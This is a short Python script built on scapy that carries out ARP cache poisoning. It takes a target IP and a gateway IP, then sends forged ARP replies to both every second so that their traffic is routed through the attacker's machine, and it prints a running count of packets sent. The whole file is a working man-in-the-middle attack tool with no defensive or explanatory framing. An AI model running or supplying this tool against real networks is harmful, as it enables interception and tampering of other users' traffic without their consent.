import sys
import scapy.all as scapy
import argparse
from time import sleep

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', dest='target', help='Specify target ip')
    parser.add_argument('-g', '--gateway', dest='gateway', help='Specify spoof ip')
    return parser.parse_args()

def get_mac(ip):
    responses, unanswered = scapy.srp(scapy.Ether(dst="FF:FF:FF:FF:FF:FF")/scapy.ARP(pdst=ip), timeout=1, retry=2, verbose=False)
    for s,r in responses:
        return r[scapy.Ether].src
    return None

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


arguments = get_arguments()
sent_packet=0
try:
    while True:
        spoof(arguments.target, arguments.gateway)
        spoof(arguments.gateway, arguments.target)
        sent_packet+=2
        print('\r[+] - Sent packet : '+str(sent_packet))
        sys.stdout.flush()
        sleep(1)

except KeyboardInterrupt:
    print('[-] - Ctrl + C detected ...')